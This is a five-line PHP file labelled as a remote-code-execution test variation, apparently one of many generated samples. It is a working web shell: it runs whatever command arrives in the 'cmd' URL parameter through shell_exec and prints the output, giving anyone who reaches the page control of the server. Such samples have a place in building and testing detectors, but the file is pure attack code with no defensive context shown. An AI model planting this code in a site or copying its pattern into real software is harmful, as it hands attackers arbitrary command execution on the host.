<?php
// RCE test variation #1113
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>